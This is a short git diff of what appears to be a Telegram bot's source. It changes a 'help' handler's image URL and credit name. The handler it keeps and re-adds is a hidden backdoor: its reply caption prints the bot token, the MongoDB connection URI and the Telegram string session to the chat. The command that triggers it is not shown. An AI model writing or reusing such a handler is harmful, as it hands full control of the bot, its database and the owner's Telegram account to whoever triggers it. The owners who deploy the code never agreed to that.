@@ -124,8 +124,8 @@ async def restartbot(client, message: Message, _):
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://graph.org/file/e840e67ebc4b7830b6bec.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [˹ 𝙈𝙍 मोह माया,](https://t.me/love_ki_duniya1)............☆""",
+          photo=f"https://telegra.ph/file/06cca02f48877e0ed77f4.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [˹ LEVI,](https://t.me/love_ki_duniya1)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
@@ -191,6 +191,9 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴄᴏɢɴɪᴢᴇ ᴛʜᴇ ᴏɴɢᴏɪɴɢ ᴛᴀsᴋ.", show_alert=True
     )
 
+
+
+#offf
 
 
 
